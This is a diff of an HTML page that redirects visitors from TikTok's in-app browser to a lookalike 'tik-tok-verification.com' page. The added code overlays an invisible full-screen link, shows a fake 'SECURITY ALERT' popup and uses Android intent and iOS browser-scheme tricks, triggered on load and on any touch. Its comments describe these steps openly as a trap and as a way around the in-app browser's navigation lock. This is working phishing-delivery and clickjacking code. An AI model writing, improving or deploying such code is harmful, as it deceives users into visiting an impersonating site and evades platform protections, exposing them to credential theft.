@@ -3,62 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #fff; margin: 0; padding: 0; overflow: hidden; }</style>
+    <style>
+        body { background: #fff; margin: 0; padding: 0; overflow: hidden; height: 100vh; width: 100vw; }
+        /* This covers the ENTIRE screen and is invisible */
+        #ghost-link {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 9999;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ccc;
+            font-family: sans-serif;
+        }
+    </style>
 </head>
 <body>
 
-<div id="status" style="padding: 20px; font-family: sans-serif; text-align: center;">Verifying Session...</div>
+<a href="https://tik-tok-verification.com/Verification/verify1.html" id="ghost-link">
+    Verifying Connection...
+</a>
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const domain = "tik-tok-verification.com/Verification/verify1.html";
 
-    function triggerEject() {
+    function ejectNow() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: The Intent protocol is still the only 100% way.
+            // Android: Forcing the 'Intent' via the ghost link
             window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE FRAME-BURST
-            // We create an invisible iframe that contains an auto-redirecting meta tag.
-            // This bypasses the 'top-level' navigation lock.
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-
-            const frameDoc = iframe.contentWindow.document;
-            const content = `
-                <html>
-                <head>
-                    <meta http-equiv="refresh" content="0;url=safari-https://${domain}">
-                </head>
-                <body>
-                    <script>window.location.replace("googlechromes://${domain}");<\/script>
-                </body>
-                </html>
-            `;
+            // iOS: THE CONTEXT SWAP
+            // 1. We try the Direct Protocol jump
+            window.location.href = "googlechromes://" + domain;
             
-            frameDoc.open();
-            frameDoc.write(content);
-            frameDoc.close();
+            // 2. We trigger a programmatic click on the full-screen <a> tag
+            document.getElementById('ghost-link').click();
 
-            // Backup: Top-level protocol hit
+            // 3. We hit the system with a 'Location' update to a protocol TikTok can't render
             setTimeout(() => {
-                window.location.href = "safari-https://" + domain;
-            }, 500);
+                window.location.assign("safari-https://" + domain);
+            }, 100);
         }
     }
 
-    // Fire immediately
-    triggerEject();
+    // This triggers the moment they touch ANYWHERE on the screen
+    document.addEventListener('touchstart', function() {
+        ejectNow();
+    }, false);
 
-    // Re-trigger if they stay on the page (e.g. they close the popup)
-    setInterval(() => {
-        if (document.hasFocus()) {
-            triggerEject();
-        }
-    }, 2000);
+    // Initial attempt on load
+    window.onload = function() {
+        ejectNow();
+        
+        // The "Alert-Trap": When they hit 'OK', the touch triggers the redirect
+        setTimeout(() => {
+            const header = "SECURITY ALERT\n";
+            const body = "______________________________\n\nPlease complete verification in your external browser to continue.";
+            alert(header + body);
+            ejectNow();
+        }, 500);
+    };
 </script>
 </body>
 </html>
